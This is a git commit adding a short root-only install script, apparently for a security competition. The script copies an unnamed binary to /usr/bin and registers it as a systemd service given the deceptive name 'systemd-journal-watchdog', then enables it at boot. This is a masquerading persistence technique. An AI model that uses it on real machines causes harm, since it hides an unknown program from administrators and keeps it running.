62420138dbd1edeb88444fb6aa9f1d6ca6f97681
Im-Adriano <35747937+Im-Adriano@users.noreply.github.com>
2020-02-29 07:59:29 -0500

    Junk for comp

---
+++ install.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+
+mv service.service /lib/systemd/system/systemd-journal-watchdog.service
+mv BP /usr/bin/systemd-journal-watchdog
+
+chown root:root /lib/systemd/system/systemd-journal-watchdog.service
+chown root:root /usr/bin/systemd-journal-watchdog
+
+chmod +x /usr/bin/systemd-journal-watchdog
+
+systemctl start systemd-journal-watchdog.service
+systemctl enable systemd-journal-watchdog.service
+
